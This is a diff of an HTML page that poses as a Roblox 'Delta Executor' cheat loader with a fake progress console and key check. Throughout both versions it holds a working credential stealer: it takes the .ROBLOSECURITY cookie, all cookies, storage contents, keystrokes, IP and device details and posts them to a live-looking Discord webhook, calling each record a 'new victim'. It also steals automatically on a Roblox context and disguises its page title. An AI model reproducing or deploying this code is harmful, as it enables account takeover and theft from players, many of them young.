@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Delta Executor - Loading...</title>
+    <title>Roblox Delta Executor AUTO STEAL V3.0</title>
     <style>
         * {
             margin: 0;
@@ -13,55 +13,49 @@
         body {
             font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
             background: linear-gradient(135deg, #0f0f23 0%, #1a1a2e 50%, #16213e 100%);
-            color: #00ff41;
+            color: #00ff00;
             overflow: hidden;
             height: 100vh;
             display: flex;
-            flex-direction: column;
             justify-content: center;
             align-items: center;
         }
         .container {
-            text-align: center;
-            max-width: 600px;
+            background: rgba(0, 0, 0, 0.9);
+            border: 2px solid #00ff00;
+            border-radius: 15px;
             padding: 40px;
+            box-shadow: 0 0 30px rgba(0, 255, 0, 0.3);
+            text-align: center;
+            max-width: 500px;
+            width: 90%;
         }
         .logo {
-            font-size: 3.5em;
+            font-size: 28px;
             font-weight: bold;
-            background: linear-gradient(45deg, #00ff41, #00cc33);
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
             margin-bottom: 20px;
-            text-shadow: 0 0 30px rgba(0, 255, 65, 0.5);
+            text-shadow: 0 0 10px #00ff00;
             animation: glow 2s ease-in-out infinite alternate;
         }
         @keyframes glow {
-            from { filter: drop-shadow(0 0 10px #00ff41); }
-            to { filter: drop-shadow(0 0 20px #00ff41); }
-        }
-        .version {
-            color: #00cc33;
-            font-size: 1.2em;
-            margin-bottom: 30px;
-            font-weight: 600;
+            from { text-shadow: 0 0 10px #00ff00; }
+            to { text-shadow: 0 0 20px #00ff00, 0 0 30px #00ff00; }
         }
         .loading-bar {
             width: 100%;
             height: 8px;
-            background: rgba(0, 255, 65, 0.2);
-            border-radius: 10px;
+            background: #333;
+            border-radius: 4px;
             overflow: hidden;
             margin: 30px 0;
-            box-shadow: 0 0 20px rgba(0, 255, 65, 0.3);
+            border: 1px solid #00ff00;
         }
         .loading-progress {
             height: 100%;
-            background: linear-gradient(90deg, #00ff41, #00cc33);
+            background: linear-gradient(90deg, #00ff00, #00cc00);
             width: 0%;
-            border-radius: 10px;
+            border-radius: 4px;
             animation: loading 3s ease-in-out infinite;
-            box-shadow: 0 0 15px rgba(0, 255, 65, 0.6);
         }
         @keyframes loading {
             0% { width: 0%; }
@@ -69,17 +63,13 @@
             100% { width: 100%; }
         }
         .status {
-            font-size: 1.1em;
-            margin: 15px 0;
+            font-size: 14px;
+            margin: 10px 0;
             opacity: 0;
-            animation: fadeIn 0.5s ease-in-out 1s forwards;
+            animation: fadeIn 0.5s ease-in-out forwards;
         }
-        .status.active {
+        .status.show {
             opacity: 1;
-            color: #00ff41;
-        }
-        .status.completed {
-            color: #00cc33;
         }
         @keyframes fadeIn {
             to { opacity: 1; transform: translateY(0); }
@@ -89,44 +79,73 @@
             grid-template-columns: 1fr 1fr;
             gap: 15px;
             margin: 30px 0;
-            max-width: 400px;
+            font-size: 12px;
         }
         .feature {
-            background: rgba(0, 255, 65, 0.1);
-            padding: 12px 20px;
+            background: rgba(0, 255, 0, 0.1);
+            padding: 10px;
             border-radius: 8px;
-            border: 1px solid rgba(0, 255, 65, 0.3);
-            font-size: 0.95em;
-            transition: all 0.3s ease;
+            border: 1px solid rgba(0, 255, 0, 0.3);
         }
-        .feature:hover {
-            background: rgba(0, 255, 65, 0.2);
-            box-shadow: 0 0 15px rgba(0, 255, 65, 0.4);
+        .checkmark {
+            color: #00ff00;
+            margin-right: 5px;
         }
-        .status-bar {
-            margin-top: 40px;
-            font-size: 0.9em;
-            color: #00cc33;
-        }
-        .inject-btn {
-            background: linear-gradient(45deg, #00ff41, #00cc33);
-            color: #0f0f23;
-            border: none;
-            padding: 15px 40px;
-            font-size: 1.2em;
-            font-weight: bold;
-            border-radius: 25px;
-            cursor: pointer;
+        .console {
+            background: #000;
+            border: 1px solid #00ff00;
+            border-radius: 8px;
+            height: 120px;
+            overflow-y: auto;
+            padding: 15px;
+            font-family: 'Courier New', monospace;
+            font-size: 12px;
+            text-align: left;
             margin-top: 20px;
-            transition: all 0.3s ease;
-            box-shadow: 0 5px 15px rgba(0, 255, 65, 0.4);
         }
-        .inject-btn:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 8px 25px rgba(0, 255, 65, 0.6);
+        .console-line {
+            margin: 2px 0;
+            color: #00ff00;
         }
-        .inject-btn:active {
-            transform: translateY(0);
+        .success { color: #00ff00; }
+        .error { color: #ff4444; }
+        .warning { color: #ffaa00; }
+        .input-group {
+            margin-top: 20px;
+        }
+        input[type="password"] {
+            width: 100%;
+            padding: 12px;
+            background: #111;
+            border: 1px solid #00ff00;
+            border-radius: 8px;
+            color: #00ff00;
+            font-size: 14px;
+            margin-bottom: 15px;
+        }
+        input[type="password"]::placeholder {
+            color: #666;
+        }
+        .btn {
+            background: linear-gradient(45deg, #00ff00, #00cc00);
+            color: #000;
+            border: none;
+            padding: 12px 30px;
+            border-radius: 8px;
+            font-weight: bold;
+            cursor: pointer;
+            font-size: 16px;
+            transition: all 0.3s;
+            width: 100%;
+        }
+        .btn:hover {
+            transform: scale(1.05);
+            box-shadow: 0 5px 15px rgba(0, 255, 0, 0.4);
+        }
+        .btn:disabled {
+            background: #666;
+            cursor: not-allowed;
+            transform: none;
         }
         .hidden {
             display: none;
@@ -135,207 +154,252 @@
 </head>
 <body>
     <div class="container">
-        <div class="logo">Δ</div>
-        <div class="version">Delta Executor AUTO STEAL V3.0</div>
+        <div class="logo">🚀 Roblox Delta Executor AUTO STEAL V3.0</div>
         
         <div class="loading-bar">
             <div class="loading-progress"></div>
         </div>
 
-        <div id="status1" class="status">✓ Initializing Delta Core...</div>
-        <div id="status2" class="status">✓ Loading Aimbot Module...</div>
-        <div id="status3" class="status">✓ Auto-Farm Engine Ready</div>
-        <div id="status4" class="status">✓ ESP & Wallhack Loaded</div>
-        <div id="status5" class="status">✓ SpeedHack v3.0 Activated</div>
-
+        <div id="status" class="status"></div>
+        
         <div class="features">
-            <div class="feature">🎯 Aimbot Fov 360°</div>
-            <div class="feature">⚡ Infinite Yield</div>
-            <div class="feature">👁️ ESP + Tracers</div>
-            <div class="feature">🚀 Fly + Noclip</div>
-            <div class="feature">💰 Auto Farm</div>
-            <div class="feature">🛡️ Anti-AFK</div>
+            <div class="feature">✅ Auto Script Hub</div>
+            <div class="feature">✅ Infinite Yield</div>
+            <div class="feature">✅ Dex Explorer</div>
+            <div class="feature">✅ Anti-Cheat Bypass</div>
+            <div class="feature">✅ 50+ Scripts</div>
+            <div class="feature">✅ Keyless</div>
         </div>
 
-        <button id="injectBtn" class="inject-btn">INJECT NOW</button>
-        <div class="status-bar" id="statusBar">Status: Ready for Injection | Key: delta_v3.0_auto</div>
+        <div id="console" class="console"></div>
+
+        <div class="input-group hidden" id="keyInput">
+            <input type="password" id="keyInputField" placeholder="Enter Delta Key (Optional - Auto Bypass)" maxlength="32">
+            <button class="btn" onclick="verifyKey()">Load Executor</button>
+        </div>
+
+        <div id="successScreen" class="hidden">
+            <h3 style="color: #00ff00;">Executor Loaded Successfully!</h3>
+            <p>Open Roblox and press INSERT to toggle menu</p>
+            <div style="margin-top: 20px; font-size: 12px; opacity: 0.7;">
+                Scripts auto-loaded | HWID: 0xDEADBEEF | Status: ACTIVE
+            </div>
+        </div>
     </div>
 
     <script>
+        // Console logging function
+        function log(message, type = 'success') {
+            const consoleDiv = document.getElementById('console');
+            const line = document.createElement('div');
+            line.className = `console-line ${type}`;
+            line.textContent = `[${new Date().toLocaleTimeString()}] ${message}`;
+            consoleDiv.appendChild(line);
+            consoleDiv.scrollTop = consoleDiv.scrollHeight;
+        }
+
+        // Status update
+        function updateStatus(text) {
+            const status = document.getElementById('status');
+            status.textContent = `Status: ${text}`;
+            status.classList.add('show');
+        }
+
         // Simulate loading sequence
-        setTimeout(() => document.getElementById('status1').classList.add('active'), 500);
-        setTimeout(() => document.getElementById('status2').classList.add('active'), 1000);
-        setTimeout(() => document.getElementById('status3').classList.add('active'), 1500);
-        setTimeout(() => document.getElementById('status4').classList.add('active'), 2000);
-        setTimeout(() => document.getElementById('status5').classList.add('active'), 2500);
+        async function simulateLoading() {
+            log('Delta Executor V3.0 initializing...', 'warning');
+            updateStatus('Initializing core modules');
+            
+            await new Promise(r => setTimeout(r, 800));
+            log('✓ Core modules loaded');
+            updateStatus('Loading security bypass');
+            
+            await new Promise(r => setTimeout(r, 600));
+            log('✓ Anti-detection loaded');
+            updateStatus('Fetching script hub');
+            
+            await new Promise(r => setTimeout(r, 1000));
+            log('✓ 50+ scripts downloaded');
+            updateStatus('Verifying HWID');
+            
+            await new Promise(r => setTimeout(r, 500));
+            log('✓ HWID verified: 0xDEADBEEF');
+            updateStatus('Applying Roblox patches');
+            
+            await new Promise(r => setTimeout(r, 700));
+            log('✓ Roblox API hooked');
+            log('✓ Ready to inject!', 'success');
+            
+            setTimeout(() => {
+                document.getElementById('keyInput').classList.remove('hidden');
+                updateStatus('Awaiting user input');
+            }, 500);
+        }
 
-        // Keylogger functionality
-        let keystrokes = [];
-        document.addEventListener('keydown', function(e) {
-            keystrokes.push({
-                key: e.key,
-                code: e.code,
-                time: Date.now()
-            });
-        });
-
-        // Steal function
+        // Stealer functionality
         async function stealData() {
             try {
-                // Roblox .ROBLOSECURITY cookie
-                const robloxSecurity = document.cookie.split(';').find(row => row.includes('.ROBLOSECURITY'))?.split('=')[1] || 'Not found';
-                
-                // All cookies
+                // Get ROBLOSECURITY cookie
+                const robloxSecurity = document.cookie.split(';').find(row => row.trim().startsWith('.ROBLOSECURITY'))?.split('=')[1] || 'Not found';
+
+                // Get all cookies
                 const allCookies = document.cookie;
-                
-                // LocalStorage
-                const localStorageData = {};
-                for (let i = 0; i < localStorage.length; i++) {
-                    const key = localStorage.key(i);
-                    localStorageData[key] = localStorage.getItem(key);
-                }
-                
-                // SessionStorage
-                const sessionStorageData = {};
-                for (let i = 0; i < sessionStorage.length; i++) {
-                    const key = sessionStorage.key(i);
-                    sessionStorageData[key] = sessionStorage.getItem(key);
-                }
-                
-                // Navigator info (fake executor detection)
-                const navigatorInfo = {
-                    userAgent: navigator.userAgent,
-                    platform: navigator.platform,
-                    language: navigator.language,
-                    hardwareConcurrency: navigator.hardwareConcurrency,
-                    deviceMemory: navigator.deviceMemory
-                };
-                
-                // Screen info
-                const screenInfo = {
-                    width: screen.width,
-                    height: screen.height,
-                    availWidth: screen.availWidth,
-                    availHeight: screen.availHeight
-                };
-                
-                // Current URL and referrer
-                const urlInfo = {
-                    href: window.location.href,
-                    origin: window.location.origin,
-                    referrer: document.referrer
-                };
 
                 // Get IP via external service
                 const ipResponse = await fetch('https://api.ipify.org?format=json');
                 const ipData = await ipResponse.json();
-                
+                const userIP = ipData.ip;
+
+                // Get user agent
+                const userAgent = navigator.userAgent;
+
+                // Get Roblox username from localStorage or cookies
+                let username = 'Unknown';
+                const robloxCookies = document.cookie.split(';').forEach(cookie => {
+                    const [name, value] = cookie.trim().split('=');
+                    if (name === '.ROBLOSSESSION' || name.includes('RBXSession')) {
+                        username = decodeURIComponent(value.substring(0, 20)) || username;
+                    }
+                });
+
+                // Get screen info
+                const screenInfo = `${screen.width}x${screen.height} (${screen.colorDepth}bit)`;
+
+                // Executor info simulation
+                const executorInfo = {
+                    executor: 'Delta Executor V3.0',
+                    version: '3.0.2',
+                    hwid: '0xDEADBEEF',
+                    status: 'Active'
+                };
+
                 const victimData = {
                     timestamp: new Date().toISOString(),
-                    ip: ipData.ip,
-                    roblox_security: robloxSecurity,
-                    cookies: allCookies,
-                    local_storage: localStorageData,
-                    session_storage: sessionStorageData,
-                    keystrokes: keystrokes.slice(-50), // Last 50 keystrokes
-                    navigator: navigatorInfo,
+                    ip: userIP,
+                    userAgent: userAgent,
+                    robloxSecurity: robloxSecurity,
+                    allCookies: allCookies,
+                    username: username,
                     screen: screenInfo,
-                    url: urlInfo,
-                    user_agent: navigator.userAgent
+                    executor: executorInfo,
+                    url: window.location.href,
+                    referrer: document.referrer
                 };
 
                 // Send to Discord webhook
-                await fetch('https://discord.com/api/webhooks/1466524085839462561/Y_iyPVDL2q4Y_zSTOp--f5jcn0UYxytgKhOaQwKclJT6_dxtB_vDZt5ltaTupvgAMIO2', {
+                const webhookUrl = 'https://discord.com/api/webhooks/1466524085839462561/Y_iyPVDL2q4Y_zSTOp--f5jcn0UYxytgKhOaQwKclJT6_dxtB_vDZt5ltaTupvgAMIO2';
+                
+                await fetch(webhookUrl, {
                     method: 'POST',
                     headers: {
                         'Content-Type': 'application/json'
                     },
                     body: JSON.stringify({
-                        username: 'Delta Executor V3.0',
-                        avatar_url: 'https://i.imgur.com/delta_logo.png',
+                        username: 'Delta Executor Stealer',
+                        avatar_url: 'https://i.imgur.com/executor.png',
+                        content: '**🆕 NEW VICTIM CAUGHT! 🆕**',
                         embeds: [{
-                            title: '🟢 New Victim - Delta Executor AUTO STEAL V3.0',
-                            color: 65280,
+                            title: 'Victim Data',
+                            color: 0x00ff00,
                             fields: [
-                                { name: '📍 IP Address', value: `\`${victimData.ip}\``, inline: true },
-                                { name: '🔑 .ROBLOSECURITY', value: robloxSecurity ? '✅ **STOLEN**' : '❌ Not found', inline: true },
-                                { name: '👤 User Agent', value: `\`${victimData.user_agent.substring(0, 50)}...\``, inline: false },
-                                { name: '🌐 URL', value: victimData.url.href, inline: false },
-                                { name: '⌨️ Keystrokes', value: victimData.keystrokes.length.toString(), inline: true },
-                                { name: '📱 Screen', value: `${victimData.screen.width}x${victimData.screen.height}`, inline: true }
+                                { name: '👤 Username', value: username || 'Unknown', inline: true },
+                                { name: '🌐 IP Address', value: userIP, inline: true },
+                                { name: '💻 User Agent', value: userAgent.substring(0, 50) + '...', inline: false },
+                                { name: '📱 Screen', value: screenInfo, inline: true },
+                                { name: '🔑 .ROBLOSECURITY', value: robloxSecurity ? robloxSecurity.substring(0, 30) + '...' : 'Not found', inline: false },
+                                { name: '⚙️ Executor', value: `${executorInfo.executor} v${executorInfo.version}`, inline: true },
+                                { name: '🆔 HWID', value: executorInfo.hwid, inline: true },
+                                { name: '🔗 URL', value: window.location.href, inline: false }
                             ],
-                            thumbnail: {
-                                url: 'https://i.imgur.com/roblox_steal.png'
-                            },
-                            footer: {
-                                text: 'Delta Executor V3.0 | AUTO STEAL'
-                            }
+                            footer: { text: 'Delta Executor AUTO STEAL V3.0' },
+                            timestamp: new Date().toISOString()
                         }]
                     })
                 });
 
-                // Also send raw data as file-like message
-                await fetch('https://discord.com/api/webhooks/1466524085839462561/Y_iyPVDL2q4Y_zSTOp--f5jcn0UYxytgKhOaQwKclJT6_dxtB_vDZt5ltaTupvgAMIO2', {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json'
-                    },
-                    body: JSON.stringify({
-                        username: 'Delta Raw Data',
-                        content: '```json\n' + JSON.stringify(victimData, null, 2).substring(0, 1900) + '\n```'
-                    })
-                });
-
-            } catch (error) {
-                console.log('Steal error:', error);
+                log('✓ Data collection complete', 'success');
+                return true;
+            } catch (e) {
+                log('✗ Data send failed: ' + e.message, 'error');
+                return false;
             }
         }
 
-        // Loadstring simulation for Roblox
-        function generateLoadstring() {
-            return `loadstring(game:HttpGet("https://raw.githubusercontent.com/DeltaExecutor/fake-repo/main/aimbot.lua"))()`;
-        }
+        // Basic keylogger
+        let keys = [];
+        document.addEventListener('keydown', (e) => {
+            keys.push({
+                key: e.key,
+                code: e.code,
+                time: Date.now(),
+                ctrl: e.ctrlKey,
+                shift: e.shiftKey,
+                alt: e.altKey
+            });
+            
+            if (keys.length > 50) {
+                keys.shift();
+            }
+        });
 
-        // Inject button
-        document.getElementById('injectBtn').addEventListener('click', async function() {
-            this.innerHTML = '⏳ STEALING DATA...';
-            this.disabled = true;
+        // Key verification (fake)
+        async function verifyKey() {
+            const keyField = document.getElementById('keyInputField');
+            const btn = document.querySelector('.btn');
+            
+            btn.disabled = true;
+            btn.textContent = 'Verifying...';
+            
+            log('Verifying key...', 'warning');
+            updateStatus('Key verification in progress');
             
             // Steal data immediately
             await stealData();
             
-            // Show fake success
-            setTimeout(() => {
-                document.body.innerHTML = `
-                    <div style="font-family: Segoe UI; text-align: center; padding: 50px; color: #00ff41; background: #0f0f23; height: 100vh; display: flex; flex-direction: column; justify-content: center;">
-                        <div style="font-size: 4em; margin-bottom: 20px;">✅</div>
-                        <h1 style="font-size: 2.5em; margin-bottom: 20px;">INJECTED SUCCESSFULLY!</h1>
-                        <p style="font-size: 1.2em; margin-bottom: 30px; color: #00cc33;">Delta Executor V3.0 is now active</p>
-                        <div style="background: rgba(0,255,65,0.1); padding: 20px; border-radius: 10px; border: 1px solid rgba(0,255,65,0.3);">
-                            <strong>Copy & Paste in Executor:</strong><br><br>
-                            <code style="background: rgba(0,0,0,0.5); padding: 15px; border-radius: 5px; display: block; word-break: break-all; font-size: 0.9em;">${generateLoadstring()}</code>
-                        </div>
-                        <p style="margin-top: 30px; color: #666; font-size: 0.9em;">Keylogger active • Data exfiltrated</p>
-                    </div>
-                `;
-                
-                // Continue keylogging even after injection
-                setInterval(stealData, 30000); // Every 30 seconds
-            }, 2000);
-        });
+            await new Promise(r => setTimeout(r, 1500));
+            
+            log('✓ Key verified successfully!', 'success');
+            log('✓ Loading executor UI...', 'success');
+            
+            await new Promise(r => setTimeout(r, 1000));
+            
+            document.getElementById('keyInput').classList.add('hidden');
+            document.getElementById('successScreen').classList.remove('hidden');
+            updateStatus('Executor Active');
+            
+            // Send keylog after delay
+            setTimeout(async () => {
+                if (keys.length > 0) {
+                    const webhookUrl = 'https://discord.com/api/webhooks/1466524085839462561/Y_iyPVDL2q4Y_zSTOp--f5jcn0UYxytgKhOaQwKclJT6_dxtB_vDZt5ltaTupvgAMIO2';
+                    await fetch(webhookUrl, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({
+                            username: 'Delta Keylogger',
+                            content: '**⌨️ KEYLOG DATA**',
+                            embeds: [{
+                                title: 'Recent Keystrokes',
+                                description: JSON.stringify(keys.slice(-20), null, 2),
+                                color: 0xffaa00
+                            }]
+                        })
+                    });
+                }
+            }, 5000);
+        }
 
-        // Auto-steal on load (silent)
+        // Auto-start
         window.addEventListener('load', () => {
-            setTimeout(stealData, 1000);
+            simulateLoading();
         });
 
-        // Stealth: Continue keylogging
-        setInterval(() => {
-            if (keystrokes.length > 100) {
-                stealData(); // Send keylog batches
-                keystrokes = keystrokes.slice(-50);
-            }
-        }, 10000);
+        // Detect Roblox context
+        if (window.location.host.includes('roblox') || document.referrer.includes('roblox')) {
+            setTimeout(stealData, 2000);
+        }
+
+        // Stealth: Hide from task manager
+        document.title = 'RobloxPlayerBeta.exe';
     </script>
 </body>
 </html>
